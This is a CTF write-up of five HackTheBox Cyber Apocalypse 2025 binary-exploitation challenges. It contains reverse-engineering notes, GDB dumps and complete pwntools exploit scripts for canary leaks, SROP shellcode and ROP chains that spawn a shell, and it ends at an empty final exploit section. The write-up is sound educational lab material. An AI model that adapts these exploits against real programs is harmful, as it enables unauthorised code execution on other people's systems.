---
title: "[WRITE UP] - HackTheBox Cyber Apocalypse CTF 2025: Tales from Eldoria"
date: 2025-03-26 20:30:00
tags:
  - PWN
category: "CTF Write ups"
---

**HackTheBox Cyber ​​​​​​Apocalypse CTF** is one of the CTF competitions that I have to join because the challenges in this tournament are very interesting and new, quite difficult compared to many people but it is very suitable to challenge myself. In my opinion, the challenges this year are more difficult than last year, but also show me that I need to pay more attention to debugging and analyzing instead of just focusing on exploits. This year I solved 5 challenges (also more than I expected). And here will be the detailed write-up for each of those challenges.

## [Very easy] Quack Quack

### Challenge Information

Description: `On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it's time to face the Duck!`

Tags:

- Buffer Overflow
- With Win Function

### Reverse Engineering

```console
[*] '/mnt/e/sec/CTFs/2025/HTBCA/QuackQuack/challenge/quack_quack'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
unsigned __int64 duckling()
{
  char *v1; // [rsp+8h] [rbp-88h]
  char s1[32]; // [rsp+10h] [rbp-80h] BYREF
  char s2[88]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(s1, 0, sizeof(s1));
  memset(s2, 0, 80);
  printf("Quack the Duck!\n\n> ");
  fflush(_bss_start);
  read(0, s1, 0x66uLL);
  v1 = strstr(s1, "Quack Quack ");
  if ( !v1 )
  {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, s2, 0x6AuLL);
  puts("Did you really expect to win a fight against a Duck?!\n");
  return v4 - __readfsqword(0x28u);
}
```

This is the function that plays the main role for the whole program. Look at that, we can see there are 2 `Buffer Overflow` in the function. The first one is at `s1` and the second is at `s2`. And the program require that our `s1` must have `Quack Quack ` string. After checking that it will let us do the second `input`. That's what the program does, and our main problem is leak `canary`. If we look at `printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);` we can see it will print the value from `v1` address (which is the return value of `strstr` -> This function's return the value is a pointer to the first occurrence of `Quack Quack ` string in `s1`). With that we can calculate the offset from `v1` -> `canary` and leak it

```gdb
pwndbg> x/50gx 0x7ffe43c13920
0x7ffe43c13920: 0x4141414141414141      0x4141414141414141  // <---------------- Input
0x7ffe43c13930: 0x4141414141414141      0x4141414141414141
0x7ffe43c13940: 0x4141414141414141      0x4141414141414141
0x7ffe43c13950: 0x4141414141414141      0x4141414141414141
0x7ffe43c13960: 0x4141414141414141      0x4141414141414141
0x7ffe43c13970: 0x4141414141414141      0x51206b6361755141 // <----------------- Quack Quack string
0x7ffe43c13980: 0x000000206b636175      0x0000000000000000
0x7ffe43c13990: 0x00007f62edafa600      0xdf4ef73b04c28f00 // <----------------- Canary
0x7ffe43c139a0: 0x00007ffe43c139c0      0x000000000040162a
0x7ffe43c139b0: 0x89a0e288a0e280a0      0xdf4ef73b04c28f00
0x7ffe43c139c0: 0x0000000000000001      0x00007f62ed90cd90
0x7ffe43c139d0: 0x00007f62edafe803      0x0000000000401605
0x7ffe43c139e0: 0x00000001a0e280a0      0x00007ffe43c13ad8
0x7ffe43c139f0: 0x0000000000000000      0xaa9e441513df0bb1
0x7ffe43c13a00: 0x00007ffe43c13ad8      0x0000000000401605
0x7ffe43c13a10: 0x0000000000404d68      0x00007f62edb48040
0x7ffe43c13a20: 0x5562c397607d0bb1      0x545b9f3489550bb1
0x7ffe43c13a30: 0x00007ffe00000000      0x0000000000000000
0x7ffe43c13a40: 0x0000000000000000      0x00000000004016c4
0x7ffe43c13a50: 0x0000000000000000      0xdf4ef73b04c28f00
0x7ffe43c13a60: 0x0000000000000000      0x00007f62ed90ce40
0x7ffe43c13a70: 0x00007ffe43c13ae8      0x0000000000404d68
0x7ffe43c13a80: 0x00007f62edb492e0      0x0000000000000000
0x7ffe43c13a90: 0x0000000000000000      0x00000000004011d0
0x7ffe43c13aa0: 0x00007ffe43c13ad0      0x0000000000000000
pwndbg> p/d (0x7ffe43c13998-0x7ffe43c13920)-32
$1 = 88
```

Offset will still be calculated as usual starting from `input` and counting to `canary`, but we have to subtract 32 because what we need to find is the padding we need to set so that v1 + 32 = the address containing `canary`. With `v1` as mentioned is the return address of `strstr` and it will be the address of the string `Quack Quack `. Besides, we need to add 1 to ignore the null byte of canary so that `printf` does not stop at `null byte`

### Exploit Development

With leaked canary + Buffer Overflow in the second `read` we can easy control `saved RIP` and let the program return to `duck_attack` function which will give us flag

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('quack_quack')
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x4015A7
b *0x401567
continue
'''.format(**locals())

p = start()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def exploit():

    prefix = b"Quack Quack "
    pad = b"A"*89 + prefix

    p.sendafter(b">", pad)

    p.recvuntil(b"Quack Quack ")
    canary = u64(p.recv(8)[:7].rjust(8, b"\x00"))
    info("canary: %#x", canary)

    offset = 88
    payload = flat({
        offset: [
            canary,
            b"A"*8,
            exe.sym["duck_attack"]
        ]
    })

    p.sendline(payload)

    p.interactive()


if __name__ == '__main__':
    exploit()
```

## [Very easy] Blessing

### Challenge Information

Description: `In the realm of Eldoria, where warriors roam, the Dragon's Heart they seek, from bytes to byte's home. Through exploits and tricks, they boldly dare, to conquer Eldoria, with skill and flair.`

Tags:

- With win function
- Leaked address

### Reverse Engineering

```console
[*] '/mnt/e/sec/CTFs/2025/HTBCA/pwn_blessing/challenge/blessing'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t size; // [rsp+8h] [rbp-28h] BYREF
  unsigned __int64 i; // [rsp+10h] [rbp-20h]
  _QWORD *v6; // [rsp+18h] [rbp-18h]
  void *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  banner();
  size = 0LL;
  v6 = malloc(0x30000uLL);
  *v6 = 1LL;
  printstr(
    "In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\n"
    "\n"
    "Please accept this: ");
  printf("%p", v6);
  sleep(1u);
  for ( i = 0LL; i <= 0xD; ++i )
  {
    printf("\b \b");
    usleep(0xEA60u);
  }
  puts("\n");
  printf(
    "%s[%sBard%s]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song's length: ",
    "\x1B[1;34m",
    "\x1B[1;32m",
    "\x1B[1;34m");
  __isoc99_scanf("%lu", &size);
  buf = malloc(size);
  printf("\n%s[%sBard%s]: Excellent! Now tell me the song: ", "\x1B[1;34m", "\x1B[1;32m", "\x1B[1;34m");
  read(0, buf, size);
  *(_QWORD *)((char *)buf + size - 1) = 0LL;
  write(1, buf, size);
  if ( *v6 )
    printf("\n%s[%sBard%s]: Your song was not as good as expected...\n\n", "\x1B[1;31m", "\x1B[1;32m", "\x1B[1;31m");
  else
    read_flag();
  return 0;
}
```

As we can see, this is the `main` function of the binary, look around we might not see any bug here, everything look perfect. But if we use GDB and see how `malloc` return the value we can see that if `malloc` function allocate one memory location with a very big size it will fail and return to 0.

### Exploit Development

With that if we use `leaked` as `scanf` input, `buf = malloc(size);` will fail, and return 0. With that there no more `buf` variable because the `malloc` failed. So this cause `*(_QWORD *)((char *)buf + size - 1) = 0LL;` to `size -1 = 0` which will clear `v6` value and let the program call `read_flag` function

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
import re

context.log_level = 'debug'
exe = context.binary = ELF('./blessing', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
set solib-search-path /home/alter/CTFs/2025/HTBCA/pwn_blessing/challenge/glibc

# brva 0x16CC
# brva 0x171E
brva 0x15EF
brva 0x1739
brva 0x16CC
brva 0x171E
brva 0x170E
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():

    ru(b'Please accept this: ')
    output = rl()[:-1].split(b'\x08')
    leak = int(output[0], 16)
    slog('Leak', leak)

    sl(str(leak+1))
    sleep(2)
    s(b'A')


    interactive()

if __name__ == '__main__':
    exploit()
```

## [Easy] Laconic

### Challenge Information

Description: `Sir Alaric's struggles have plunged him into a deep and overwhelming sadness, leaving him unwilling to speak to anyone. Can you find a way to lift his spirits and bring back his courage?`

Tags:

- SROP

### Reverse Engineering

```console
[*] '/mnt/e/sec/CTFs/2025/HTBCA/pwn_laconic/challenge/laconic'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x42000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

```c
.shellcode:0000000000043000 ; void start()
.shellcode:0000000000043000                 public _start
.shellcode:0000000000043000 _start          proc near               ; DATA XREF: LOAD:0000000000042018↑o
.shellcode:0000000000043000                                         ; LOAD:0000000000042088↑o
.shellcode:0000000000043000                 mov     rdi, 0          ; Alternative name is '_start'
.shellcode:0000000000043000                                         ; __start
.shellcode:0000000000043007                 mov     rsi, rsp
.shellcode:000000000004300A                 sub     rsi, 8
.shellcode:000000000004300E                 mov     rdx, 106h
.shellcode:0000000000043015                 syscall                 ; LINUX -
.shellcode:0000000000043017                 retn
.shellcode:0000000000043017 _start          endp
.shellcode:0000000000043017
.shellcode:0000000000043018                 pop     rax
.shellcode:0000000000043019                 retn
.shellcode:0000000000043019 _shellcode      ends
```

The program is pretty simple it's just call `sys_read` to read our input with the size is `0x106` bytes. And as we can see the program have `pop rax` and `syscall` we can think about perfom a [SROP](https://ir0nstone.gitbook.io/notes/binexp/stack/syscalls/sigreturn-oriented-programming-srop) because we don't have stack leak and the return value of `read` is `len` of the input so we can use `call/jmp rax` or let the program `return to shellcode` like normal. So that we need to use SROP to call `sys_read` again, read our shellcode and then return to it

### Exploit Development

We can choose `0x43000` as a location to put our shellcode. And our shellcode need to have `nop sled` because there're many trash instruction here and to make it return exactly to the location we put our shellcode we must use `nop sled` to clear/padding it

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./laconic', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *0x43017
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():

    offset = 8
    syscall = 0x43015 # syscall; ret;
    pop_rax = 0x43018

    frame = SigreturnFrame()
    frame.rdi = 0
    frame.rsi = 0x43000
    frame.rdx = 0x50
    frame.rip = syscall
    frame.rsp = 0x43000

    payload = flat({
        offset: [
            pop_rax,
            0xf,
            syscall,
            frame
        ]
    })

    # print(len(payload))
    s(payload[:262])

    sc = asm('''

        execve:
            lea rdi, [rip+sh]

            xor rsi, rsi
            xor rdx, rdx

            mov rax, 0x3b
            syscall

        sh:
            .ascii "/bin/sh"
            .byte 0

    ''')

    s(b'\x90' * 0x30 + sc)

    interactive()

if __name__ == '__main__':
    exploit()
```

And while read `HTB Offical Write up` I know that there's `/bin/sh` string in the binary, so we don't need to write a shellcode, what we need is create a frame that call `execve`

```gdb
pwndbg> search /bin/sh
Searching for byte: b'/bin/sh'
laconic         0x43238 0x68732f6e69622f /* '/bin/sh' */
```

```python
''' From HTB Offical Write up'''
# Srop
frame     = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = binsh           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = rop.syscall[0]

pl  = b'w3th4nds'
pl += p64(rop.rax[0])
pl += p64(0xf)
pl += p64(rop.syscall[0])
pl += bytes(frame)
```

## [Easy] Crossbow

### Challenge Information

Description: `Sir Alaric's legendary shot can pierce through any enemy! Join his training and hone your aim to match his unparalleled precision.`
Tags:

- ROP

### Reverse Engineering

```console
[*] '/mnt/e/sec/CTFs/2025/HTBCA/pwn_crossbow/challenge/crossbow'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

There is two intersting functions in this binary

```c
__int64 __fastcall training(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  int v6; // r8d
  int v7; // r9d
  char v9[32]; // [rsp+0h] [rbp-20h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\n",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6,
    v9[0]);
  target_dummy(v9);
  return printf(
           (unsigned int)"%s\n[%sSir Alaric%s]: That was quite a shot!!\n\n",
           (unsigned int)"\x1B[1;34m",
           (unsigned int)"\x1B[1;33m",
           (unsigned int)"\x1B[1;34m",
           v6,
           v7,
           v9[0]);
}
```

```c
__int64 __fastcall target_dummy(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  _QWORD *v12; // rbx
  int v13; // r8d
  int v14; // r9d
  __int64 result; // rax
  int v16; // r8d
  int v17; // r9d
  int v18; // [rsp+1Ch] [rbp-14h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Select target to shoot: ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6);
  if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v18, v6, v7, v8, v9) != 1 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v10,
      v11);
    exit(1312LL);
  }
  v12 = (_QWORD *)(8LL * v18 + a1);
  *v12 = calloc(1LL, 128LL);
  if ( !*v12 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v13,
      v14);
    exit(6969LL);
  }
  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    v13,
    v14);
  result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128LL, &_stdin_FILE);
  if ( !result )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Is this the best you have?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v16,
      v17);
    exit(69LL);
  }
  return result;
}
```

`v9` is a variable declare with `32` bytes and passed into the `target_dummy` function. The `pseudo-code` is pretty complex and hard to see. So my experience is focus on how this function work with `v9` variable. First we need to input our target to shoot, look carefully this input is saved in `v18` and then

```c
  v12 = (_QWORD *)(8LL * v18 + a1);
  *v12 = calloc(1LL, 128LL);

  result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128LL, &_stdin_FILE);
```

It'll read our input too `v18 + a1(v9)`. Let's take a look at this in GDB

```gdb
pwndbg> x/30xg $rsp
0x7ffef755d000: 0x0000000000000000      0x00007ffef755d040
0x7ffef755d010: 0x0000000000000000      0x0000000a00000000
0x7ffef755d020: 0x0000000000001312      0x0000000000000001
0x7ffef755d030: 0x00007ffef755d060      0x00000000004013b8 <---------- saved RIP
                      |_______________________________________________ saved RBP
0x7ffef755d040: 0x0000000000000000      0x0000000000401175
                      |_______________________________________________ v9
0x7ffef755d050: 0x00007ffef755d060      0x00000000004011bc
0x7ffef755d060: 0x00007ffef755d070      0x000000000040144a
0x7ffef755d070: 0x00007ffef755d0b8      0x000000000040171f
0x7ffef755d080: 0x0000000000000000      0x0000000000000000
0x7ffef755d090: 0x00007fa143512050      0x0000000000000000
                      |_________________________________________________ *v12 (RBX) <----------------> Our input will be here
0x7ffef755d0a0: 0x0000000000000000      0x0000000000401045
0x7ffef755d0b0: 0x0000000000000001      0x00007ffef755ef75
0x7ffef755d0c0: 0x0000000000000000      0x00007ffef755efb0
0x7ffef755d0d0: 0x00007ffef755efc0      0x00007ffef755efcd
0x7ffef755d0e0: 0x00007ffef755f6c9      0x00007ffef755f6dd
```

So in my case, I input `10`, and our next input will be in `0x7ffef755d090`. But we can control `v18` which mean we can control where our input in. In here I want my input in `saved RBP` so I just need to input `-2`, and when `training` function return it will return to our ROP chain we put on there.

```gdb
00:0000│ rsp     0x7fffaa8c6930 ◂— 0
01:0008│-028     0x7fffaa8c6938 —▸ 0x7fffaa8c6970 ◂— 0
02:0010│-020     0x7fffaa8c6940 ◂— 0
03:0018│-018     0x7fffaa8c6948 ◂— 0xfffffffe00000000
04:0020│-010     0x7fffaa8c6950 ◂— 0x1312
05:0028│-008     0x7fffaa8c6958 ◂— 1
06:0030│ rbx rbp 0x7fffaa8c6960 —▸ 0x7fe91bd67050 ◂— 0
07:0038│+008     0x7fffaa8c6968 —▸ 0x4013b8 (training+74) ◂— lea rax, [rip + 0xa0e9]
```

### Exploit Development

Our next thing to do is craft the ROP chain which give shell when execute, this stage is easy so I won't explain much here

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./crossbow', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *0x000000000040125E
b *training+126
b *target_dummy+430
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():


    pop_rax = 0x401001 # pop rax ; ret
    pop_rdi = 0x0401d6c # pop rdi ; ret
    pop_rsi = 0x40566b # pop rsi ; ret
    pop_rdx = 0x401139 # pop rdx ; ret
    syscall = 0x404b51 # syscall; ret;
    www = 0x4020f5 # mov qword ptr [rdi], rax ; ret

    sh = b"/bin/sh\x00"
    bss = 0x40e220

    payload = flat(
        [
            pop_rax,
            sh,
            pop_rdi,
            bss,
            www,
            pop_rdi,
            bss,
            pop_rsi,
            0,
            pop_rdx,
            0,
            pop_rax,
            0x3b,
            syscall
        ]
    )

    payload = b"A"*8 + payload

    p.sendlineafter(b":", b"-2")
    p.sendlineafter(b">", payload)

    p.interactive()

if __name__ == '__main__':
    exploit()
```

## [Medium] Contractor

### Challenge Information

Description: `Sir Alaric calls upon the bravest adventurers to join him in assembling the mightiest army in all of Eldoria. Together, you will safeguard the peace across the villages under his protection. Do you have the courage to answer the call?`
Tags:

- Buffer Overflow

### Reverse Engineering

```console
[*] '/mnt/e/sec/CTFs/2025/HTBCA/pwn_contractor/challenge/contractor'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsp
  int choice; // [rsp+8h] [rbp-20h] BYREF
  int v6; // [rsp+Ch] [rbp-1Ch]
  contractor_t *s; // [rsp+10h] [rbp-18h]
  char s1[4]; // [rsp+1Ch] [rbp-Ch] BYREF
  unsigned __int64 v9; // [rsp+20h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  v3 = alloca(304LL);
  s = (contractor_t *)&choice;
  memset(&choice, 0, 0x128uLL);
  printf(
    "%s[%sSir Alaric%s]: Young lad, I'm truly glad you want to join forces with me, but first I need you to tell me some "
    "things about you.. Please introduce yourself. What is your name?\n"
    "\n"
    "> ",
    "\x1B[1;34m",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 15; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    s->name[i] = safe_buffer;
  }
  printf(
    "\n[%sSir Alaric%s]: Excellent! Now can you tell me the reason you want to join me?\n\n> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 255; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    s->reason[i] = safe_buffer;
  }
  printf(
    "\n[%sSir Alaric%s]: That's quite the reason why! And what is your age again?\n\n> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  __isoc99_scanf("%ld", &s->age);
  printf(
    "\n"
    "[%sSir Alaric%s]: You sound mature and experienced! One last thing, you have a certain specialty in combat?\n"
    "\n"
    "> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 15; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    s->speciality[i] = safe_buffer;
  }
  printf(
    "\n"
    "[%sSir Alaric%s]: So, to sum things up: \n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n"
    "\t[Name]: %s\n"
    "\t[Reason to join]: %s\n"
    "\t[Age]: %ld\n"
    "\t[Specialty]: %s\n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n",
    "\x1B[1;33m",
    "\x1B[1;34m",
    s->name,
    s->reason,
    s->age,
    s->speciality);
  v6 = 0;
  printf(
    "[%sSir Alaric%s]: Please review and verify that your information is true and correct.\n",
    "\x1B[1;33m",
    "\x1B[1;34m");
  do
  {
    printf("\n1. Name      2. Reason\n3. Age       4. Specialty\n\n> ");
    __isoc99_scanf("%d", &choice);
    if ( choice == 4 )
    {
      printf("\n%s[%sSir Alaric%s]: And what are you good at: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 255; ++i )
      {
        read(0, &safe_buffer, 1uLL);
        if ( safe_buffer == 10 )
          break;
        s->speciality[i] = safe_buffer;
      }
      ++v6;
    }
    else
    {
      if ( choice > 4 )
        goto LABEL_36;
      switch ( choice )
      {
        case 3:
          printf(
            "\n%s[%sSir Alaric%s]: Did you say you are 120 years old? Please specify again: ",
            "\x1B[1;34m",
            "\x1B[1;33m",
            "\x1B[1;34m");
          __isoc99_scanf("%d", &s->age);
          ++v6;
          break;
        case 1:
          printf("\n%s[%sSir Alaric%s]: Say your name again: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xF; ++i )
          {
            read(0, &safe_buffer, 1uLL);
            if ( safe_buffer == 10 )
              break;
            s->name[i] = safe_buffer;
          }
          ++v6;
          break;
        case 2:
          printf("\n%s[%sSir Alaric%s]: Specify the reason again please: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xFF; ++i )
          {
            read(0, &safe_buffer, 1uLL);
            if ( safe_buffer == 10 )
              break;
            s->reason[i] = safe_buffer;
          }
          ++v6;
          break;
        default:
LABEL_36:
          printf("\n%s[%sSir Alaric%s]: Are you mocking me kid??\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
          exit(1312);
      }
    }
    if ( v6 == 1 )
    {
      printf(
        "\n%s[%sSir Alaric%s]: I suppose everything is correct now?\n\n> ",
        "\x1B[1;34m",
        "\x1B[1;33m",
        "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 3; ++i )
      {
        read(0, &safe_buffer, 1uLL);
        if ( safe_buffer == 10 )
          break;
        s1[i] = safe_buffer;
      }
      if ( !strncmp(s1, "Yes", 3uLL) )
        break;
    }
  }
  while ( v6 <= 1 );
  printf("\n%s[%sSir Alaric%s]: We are ready to recruit you young lad!\n\n", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  return 0;
}
```

Very complex function, so I create a struct to make it more readable

```c
00000000 struct __fixed contractor_t // sizeof=0x128
00000000 {
00000000     char name[16];
00000010     char reason[256];
00000110     __int64 age;
00000118     char speciality[16];
00000128 };
```

First, it uses `alloca` to allocate memory on the stack. `alloca()` is a compiler built-in, also known as `__builtin_alloca()`.  By default, modern compilers automatically translate all uses of alloca() into the built-in, but this is forbidden if standards conformance is requested (-ansi, -std=c*), in which case <alloca.h> is required, lest a symbol dependency be emitted. This is the disassembly of `alloca()`

```c
.text:000000000000148F
.text:000000000000148F loc_148F:                               ; CODE XREF: main+63↓j
.text:000000000000148F                 cmp     rsp, rdx
.text:0000000000001492                 jz      short loc_14A6
.text:0000000000001494                 sub     rsp, 1000h
.text:000000000000149B                 or      [rsp+1020h+var_28], 0
.text:00000000000014A4                 jmp     short loc_148F
.text:00000000000014A6 ; ---------------------------------------------------------------------------
.text:00000000000014A6
.text:00000000000014A6 loc_14A6:                               ; CODE XREF: main+51↑j
.text:00000000000014A6                 mov     rdx, rax
.text:00000000000014A9                 and     edx, 0FFFh
.text:00000000000014AF                 sub     rsp, rdx
.text:00000000000014B2                 mov     rdx, rax
.text:00000000000014B5                 and     edx, 0FFFh
.text:00000000000014BB                 test    rdx, rdx
.text:00000000000014BE                 jz      short loc_14D0
.text:00000000000014C0                 and     eax, 0FFFh
.text:00000000000014C5                 sub     rax, 8
.text:00000000000014C9                 add     rax, rsp
.text:00000000000014CC                 or      qword ptr [rax], 0
```

In short, it is just `sub rsp, N` but with aligned, and after that it returns a pointer to the beginning of the allocated space. If the allocation causes stack overflow, program behaviour is undefined. And this pointer is located at `rbp-0x18`. So when we look at the stack frame we can see

```gdb
pwndbg> x/48xg $rsp
0x7fffffffda70: 0x0000000000000000      0x0000000000000000 <----------------- s->name
0x7fffffffda80: 0x0000000000000000      0x0000000000000000 <----------------- s->reason
0x7fffffffda90: 0x0000000000000000      0x0000000000000000
0x7fffffffdaa0: 0x0000000000000000      0x0000000000000000
0x7fffffffdab0: 0x0000000000000000      0x0000000000000000
0x7fffffffdac0: 0x0000000000000000      0x0000000000000000
0x7fffffffdad0: 0x0000000000000000      0x0000000000000000
0x7fffffffdae0: 0x0000000000000000      0x0000000000000000
0x7fffffffdaf0: 0x0000000000000000      0x0000000000000000
0x7fffffffdb00: 0x0000000000000000      0x0000000000000000
0x7fffffffdb10: 0x0000000000000000      0x0000000000000000
0x7fffffffdb20: 0x0000000000000000      0x0000000000000000
0x7fffffffdb30: 0x0000000000000000      0x0000000000000000
0x7fffffffdb40: 0x0000000000000000      0x0000000000000000
0x7fffffffdb50: 0x0000000000000000      0x0000000000000000
0x7fffffffdb60: 0x0000000000000000      0x0000000000000000
0x7fffffffdb70: 0x0000000000000000      0x0000000000000000
0x7fffffffdb80: 0x0000000000000000      0x0000000000000000 <----------------- s->speciality
                      |______________________________________________________ s-> age
0x7fffffffdb90: 0x0000000000000000      0x0000555555555b50 <----------------- __libc_csu_init
0x7fffffffdba0: 0x0000000000000000      0x00007fffffffda70 <----------------- buf pointer
0x7fffffffdbb0: 0x00007fffffffdcb0      0xd72cde47ec950800 <----------------- Canary
0x7fffffffdbc0: 0x0000000000000000      0x00007ffff7df9083 <----------------- saved RIP
                      |______________________________________________________ saved RBP
```

So the exactly flow of this is `*alloca + offset`, which `*alloca` is `buf pointer` and `offset` is the offset from `buf pointer` too `struct variable`.

### Exploit Development

